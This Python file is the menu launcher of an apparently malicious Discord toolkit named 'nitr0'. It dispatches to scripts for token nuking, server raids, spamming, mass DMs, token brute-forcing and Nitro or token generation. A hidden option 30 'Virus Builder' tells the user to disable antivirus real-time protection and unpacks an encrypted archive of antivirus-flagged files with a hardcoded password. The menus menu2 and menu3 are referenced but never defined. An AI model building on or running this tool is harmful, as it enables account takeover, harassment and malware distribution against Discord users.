from Program.Config.Config import *
from Program.Config.Util import *

try:
   import webbrowser
   import re
   import pyzipper
except Exception as e:
   ErrorModule(e)

option_01 = "Discord-Token-Nuker"
option_02 = "Discord-Token-Info"
option_03 = "Discord-Token-Joiner"
option_04 = "Discord-Token-Leaver"
option_05 = "Discord-Token-Login"
option_06 = "Discord-Token-To-Id-And-Brute"
option_07 = "Discord-Token-Server-Raid"
option_08 = "Discord-Token-Spammer"
option_09 = "Discord-Token-Delete-Friends"

option_10 = "Discord-Token-Block-Friends"
option_11 = "Discord-Token-Mass-Dm"
option_12 = "Discord-Token-Delete-Dm"
option_13 = "Discord-Token-Status-Changer"
option_14 = "Discord-Token-Language-Changer"
option_15 = "Discord-Token-House-Changer"
option_16 = "Discord-Token-Theme-Changer"
option_17 = "Discord-Token-Generator"
option_18 = "Discord-Bot-Server-Nuker"
option_19 = "Discord-Bot-Invite-To-Id"

option_20 = "Discord-Server-Info"
option_21 = "Discord-Nitro-Generator"
option_22 = "Discord-Webhook-Info"
option_23 = "Discord-Webhook-Delete"
option_24 = "Discord-Webhook-Spammer"


option_next = "Next"
option_back = "Back"
option_site = "Site"
option_info = "Info"

option_01_txt = f"{red}[{white}01{red}]{white} " + option_01.ljust(30)[:30].replace("-", " ")
option_02_txt = f"{red}[{white}02{red}]{white} " + option_02.ljust(30)[:30].replace("-", " ")
option_03_txt = f"{red}[{white}03{red}]{white} " + option_03.ljust(30)[:30].replace("-", " ")
option_04_txt = f"{red}[{white}04{red}]{white} " + option_04.ljust(30)[:30].replace("-", " ")
option_05_txt = f"{red}[{white}05{red}]{white} " + option_05.ljust(30)[:30].replace("-", " ")
option_06_txt = f"{red}[{white}06{red}]{white} " + option_06.ljust(30)[:30].replace("-", " ")
option_07_txt = f"{red}[{white}07{red}]{white} " + option_07.ljust(30)[:30].replace("-", " ")
option_08_txt = f"{red}[{white}08{red}]{white} " + option_08.ljust(30)[:30].replace("-", " ")
option_09_txt = f"{red}[{white}09{red}]{white} " + option_09.ljust(30)[:30].replace("-", " ")

option_10_txt = f"{red}[{white}10{red}]{white} " + option_10.ljust(30)[:30].replace("-", " ")
option_11_txt = f"{red}[{white}11{red}]{white} " + option_11.ljust(30)[:30].replace("-", " ")
option_12_txt = f"{red}[{white}12{red}]{white} " + option_12.ljust(30)[:30].replace("-", " ")
option_13_txt = f"{red}[{white}13{red}]{white} " + option_13.ljust(30)[:30].replace("-", " ")
option_14_txt = f"{red}[{white}14{red}]{white} " + option_14.ljust(30)[:30].replace("-", " ")
option_15_txt = f"{red}[{white}15{red}]{white} " + option_15.ljust(30)[:30].replace("-", " ")
option_16_txt = f"{red}[{white}16{red}]{white} " + option_16.ljust(30)[:30].replace("-", " ")
option_17_txt = f"{red}[{white}17{red}]{white} " + option_17.ljust(30)[:30].replace("-", " ")
option_18_txt = f"{red}[{white}18{red}]{white} " + option_18.ljust(30)[:30].replace("-", " ")
option_19_txt = f"{red}[{white}19{red}]{white} " + option_19.ljust(30)[:30].replace("-", " ")

option_20_txt = f"{red}[{white}20{red}]{white} " + option_20.ljust(30)[:30].replace("-", " ")
option_21_txt = f"{red}[{white}21{red}]{white} " + option_21.ljust(30)[:30].replace("-", " ")
option_22_txt = f"{red}[{white}22{red}]{white} " + option_22.ljust(30)[:30].replace("-", " ")
option_23_txt = f"{red}[{white}23{red}]{white} " + option_23.ljust(30)[:30].replace("-", " ")
option_24_txt = f"{red}[{white}24{red}]{white} " + option_24.ljust(30)[:30].replace("-", " ")

option_back_txt = option_back + f" {red}[{white}B{red}]{white}"
option_next_txt = option_next + f" {red}[{white}N{red}]{white}"
option_site_txt = f"{red}[{white}S{red}]{white} " + option_site
option_info_txt =  f"{red}[{white}I{red}]{white} " + option_info

menu1 = f""" ┌─ {option_info_txt}                                                                                                {option_next_txt} ─┐
 ├─ {option_site_txt}                                           ┌─────────┐                                                    │
─┴─┬───────────────────────────────────────────────────┤ Discord ├────────────────────────────────────────────────────┘
   │                                                   └─────────┘                       
   ├─ {option_01_txt                    }┌─ {option_11_txt                    }
   ├─ {option_02_txt                    }├─ {option_12_txt                    }┌─  {option_21_txt}
   ├─ {option_03_txt                    }├─ {option_13_txt                    }├─ {option_22_txt}
   ├─ {option_04_txt                    }├─ {option_14_txt                    }├─ {option_23_txt}
   ├─ {option_05_txt                    }├─ {option_15_txt                    }├─ {option_24_txt}
   ├─ {option_06_txt                    }├─ {option_16_txt                    }│
   ├─ {option_07_txt                    }├─ {option_17_txt                    }│
   ├─ {option_08_txt                    }├─ {option_18_txt                    }│
   ├─ {option_09_txt                    }├─ {option_19_txt                    }│
   ├─ {option_10_txt                    }├─ {option_20_txt                    }│
   └─────────────────────────────────────┴─────────────────────────────────────┘

"""



def Menu():
   popup_version = ""

   try:
      with open(menu_path, "r") as file:
         menu_number = file.read()
      menu_mapping = {"1": menu1, "2": menu2, "3": menu3}
      menu = menu_mapping.get(menu_number, menu1)
   except:
      menu = menu1
      menu_number = "1"

   banner = f"""{popup_version}                                                                                                                        
                                       ███╗   ██╗██╗████████╗██████╗  ██████╗ 
                                       ████╗  ██║██║╚══██╔══╝██╔══██╗██╔═████╗
                                       ██╔██╗ ██║██║   ██║   ██████╔╝██║██╔██║
                                       ██║╚██╗██║██║   ██║   ██╔══██╗████╔╝██║  
                                       ██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝
                                       ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════


{menu}"""
   return banner, menu_number

while True:
   try:
      Clear()

      banner, menu_number = Menu()

      Title("nitr0 1.1.1")
      Slow(MainColor(banner))

      choice = input(MainColor(f""" ┌──({white}{username_pc}@nitr0)─{red}[{white}~/{os_name}/Menu-{menu_number}]
 └─{white}$ {reset}"""))

      if choice in ['N', 'n', 'NEXT', 'Next', 'next']:
         menu_number = {"1": "2", "2": "3", "3": "1"}.get(menu_number, "1")
         with open(menu_path, "w") as file:
            file.write(menu_number)
         continue

      elif choice in ['B', 'b', 'BACK', 'Back', 'back']:
         menu_number = {"2": "1", "3": "2"}.get(menu_number, "1")
         with open(menu_path, "w") as file:
            file.write(menu_number)
         continue

      elif choice in ['I', 'i', 'INFO', 'Info', 'info']:
         StartProgram(f"{option_info}.py")
         continue

      elif choice in ['S', 's', 'SITE', 'Site', 'site']:
         StartProgram(f"{option_site}.py")
         continue
      
      elif choice == '30':
         if os_name == "Linux":
            print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} The builder virus is only compatible with Windows, under Linux it can encounter big problems.")
            messagebox.showinfo("nitr0 1.1.1 - Virus Builder", "The builder virus is only compatible with Windows, under Linux it can encounter big problems.")

         print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} It is important to disable your antivirus (Real-time Protection) before building, so that no files are deleted.")
         messagebox.showinfo("nitr0 1.1.1 - Virus Builder", "It is important to disable your antivirus (Real-time Protection) before building, so that no files are deleted.")
         try:
            zip_file_path = os.path.join(tool_path, "Program", "FileDetectedByAntivirus", "Password(redtiger).zip")
            file_path = os.path.join(tool_path, "Program", "FileDetectedByAntivirus", "VirusBuilderOptions.py")
            output = os.path.join(tool_path, "Program", "FileDetectedByAntivirus")
            if not os.path.exists(file_path):
               if os.path.exists(zip_file_path):
                  print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Decompression of the encrypted file: {white}Program\\FileDetectedByAntivirus\\Password(redtiger).zip")
                  with pyzipper.AESZipFile(zip_file_path) as zf:
                     zf.pwd = b'redtiger'
                     zf.extractall(output)
                  time.sleep(3)
               else:
                  print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Files are missing, please reinstall the tool.")
         except Exception as e:
            Error(e)

      options = {
         '01': option_01, '02': option_02, '03': option_03, '04': option_04,
         '05': option_05, '06': option_06, '07': option_07, '08': option_08,
         '09': option_09, '10': option_10, '11': option_11, '12': option_12,
         '13': option_13, '14': option_14, '15': option_15, '16': option_16,
         '17': option_17, '18': option_18, '19': option_19, '20': option_20,
         '21': option_21, '22': option_22, '23': option_23, '24': option_24,
      }

      if choice in options:  
         StartProgram(f"{options[choice]}.py")
      elif '0' + choice in options:
         StartProgram(f"{options['0' + choice]}.py")
      else:
         ErrorChoiceStart()

   except Exception as e:
      Error(e)
